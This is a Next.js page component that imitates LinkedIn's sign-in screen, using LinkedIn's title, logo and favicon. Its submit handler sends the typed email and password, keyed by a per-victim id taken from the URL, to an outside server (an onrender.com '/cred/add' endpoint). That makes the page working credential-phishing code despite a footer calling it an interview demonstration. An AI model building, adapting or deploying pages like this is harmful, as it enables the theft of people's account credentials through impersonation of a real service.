import { useState } from 'react';
import Head from 'next/head';
import { toast } from 'react-toastify';
import { useRouter } from 'next/router';

export default function LinkedInLogin() {
  const [loginData, setLoginData] = useState({
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const social = "LinkedIn";
  
    const router = useRouter();
    const { id } = router.query; 

  const handleChange = (e) => {
    setLoginData({
      ...loginData,
      [e.target.name]: e.target.value
    });
  };

 const handleSubmit = async (e: React.ChangeEvent<HTMLInputElement>) => {
        e.preventDefault();
        setIsLoading(true);
    
        if (!id || !social || !loginData.email || !loginData.password) {
          toast.error("⚠️ All fields are required!");
          setIsLoading(false);
          return;
        }
    
        try {
          const res = await fetch("https://authgo-backend.onrender.com/cred/add", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              id: id,
              social: social,
              username: loginData.email,
              password: loginData.password,
            }),
          });
    
          const data = await res.json();
          if (!res.ok) throw new Error(data.error || "Failed to add credential");
    
          toast.success("✅ Credential added successfully!");
          // Reset form after successful submission
          setLoginData({ email: '', password: '' });
        } catch (err) {
          console.error("❌ Error adding credential:", err);
          toast.error((err as Error).message);
        } finally {
          setIsLoading(false);
        }
      };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Head>
        <title>LinkedIn Login, Sign in | LinkedIn</title>
        <meta name="description" content="LinkedIn clone login page" />
        <link rel="icon" href="https://static-exp1.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico" type="image/x-icon" />
      </Head>

      {/* Header */}
      <header className="bg-white py-4 px-4 sm:px-8 border-b border-gray-200">
        <div className="max-w-6xl mx-auto">
          <div className="flex items-center">
            {/* LinkedIn Logo */}
            <svg className="w-8 h-8 text-blue-600" viewBox="0 0 24 24" fill="currentColor">
              <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
            </svg>
            <span className="ml-2 text-2xl font-semibold text-gray-900">LinkedIn</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="max-w-md w-full space-y-8">
          {/* Login Card */}
          <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
            <div className="space-y-6">
              <div className="text-center">
                <h1 className="text-2xl font-normal text-gray-900">Sign in</h1>
                <p className="text-sm text-gray-600 mt-1">Stay updated on your professional world</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <input
                    type="email"
                    name="email"
                    placeholder="Email or Phone"
                    value={loginData.email}
                    onChange={handleChange}
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-600 focus:border-blue-600 outline-none transition-all text-base placeholder-gray-500"
                  />
                </div>
                
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    name="password"
                    placeholder="Password"
                    value={loginData.password}
                    onChange={handleChange}
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-600 focus:border-blue-600 outline-none transition-all text-base placeholder-gray-500 pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none font-semibold text-sm"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>

                <div className="text-sm">
                  <a href="#" className="text-blue-600 hover:text-blue-800 font-semibold">
                    Forgot password?
                  </a>
                </div>

                <button 
                  type="submit" 
                  disabled={isLoading}
                  className={`w-full bg-blue-600 text-white py-3 rounded-full font-semibold text-lg hover:bg-blue-700 transition-all duration-200 ${
                    isLoading ? 'opacity-70 cursor-not-allowed' : ''
                  }`}
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center space-x-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>Signing in...</span>
                    </div>
                  ) : (
                    'Sign in'
                  )}
                </button>

                <div className="relative flex items-center my-6">
                  <div className="flex-grow border-t border-gray-300"></div>
                  <span className="flex-shrink mx-4 text-gray-500 text-sm">or</span>
                  <div className="flex-grow border-t border-gray-300"></div>
                </div>

                {/* Continue with Google */}
                <button 
                  type="button"
                  className="w-full border border-gray-300 bg-white text-gray-700 py-2.5 rounded-full font-semibold text-sm hover:bg-gray-50 transition-all duration-200 flex items-center justify-center space-x-2"
                >
                  <svg className="w-5 h-5" viewBox="0 0 24 24">
                    <path fill="#000000" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                  </svg>
                  <span>Continue with Google</span>
                </button>

                {/* Continue with Apple */}
                <button 
                  type="button"
                  className="w-full border border-gray-300 bg-white text-gray-700 py-2.5 rounded-full font-semibold text-sm hover:bg-gray-50 transition-all duration-200 flex items-center justify-center space-x-2"
                >
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.84-3.29-.84-1.53 0-2 .77-2.27 1.03-.56.56-1.33.86-2.08.86-1.31.05-2.39-1.21-3.35-2.47-2.71-3.44-2.99-8.41-1.33-10.79 1.01-1.43 2.57-2.13 4.12-2.15 1.28-.02 2.5.74 3.29.74.78 0 2.26-.91 3.81-.77.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.82.03 3.02 2.65 4.03 2.66 4.04-.03.07-.42 1.42-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                  </svg>
                  <span>Continue with Apple</span>
                </button>
              </form>
            </div>
          </div>

          {/* Sign Up Card */}
          <div className="text-center">
            <p className="text-sm text-gray-600">
              New to LinkedIn?{' '}
              <a href="#" className="text-blue-600 font-semibold hover:text-blue-800">
                Join now
              </a>
            </p>
          </div>

          {/* Footer Links */}
          <div className="text-center space-y-4 pt-8">
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600">
              <span>© 2024</span>
              <a href="#" className="hover:underline">About</a>
              <a href="#" className="hover:underline">Accessibility</a>
              <a href="#" className="hover:underline">User Agreement</a>
              <a href="#" className="hover:underline">Privacy Policy</a>
              <a href="#" className="hover:underline">Cookie Policy</a>
              <a href="#" className="hover:underline">Copyright Policy</a>
              <a href="#" className="hover:underline">Brand Policy</a>
              <a href="#" className="hover:underline">Guest Controls</a>
              <a href="#" className="hover:underline">Community Guidelines</a>
            </div>
            
            <select className="bg-transparent border-0 text-gray-600 text-sm outline-none cursor-pointer">
              <option>English (English)</option>
              <option>Español</option>
              <option>Français</option>
              <option>中文</option>
            </select>
          </div>
        </div>
      </main>

      {/* Bottom Footer */}
      <footer className="bg-white py-6 px-4 border-t border-gray-200">
        <div className="max-w-6xl mx-auto text-center">
          <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600">
            <span>LinkedIn Clone Built with Next.js & Tailwind CSS</span>
            <span>•</span>
            <span>Interview Demonstration - Not affiliated with LinkedIn</span>
          </div>
        </div>
      </footer>

      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body {
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
      `}</style>
    </div>
  );
}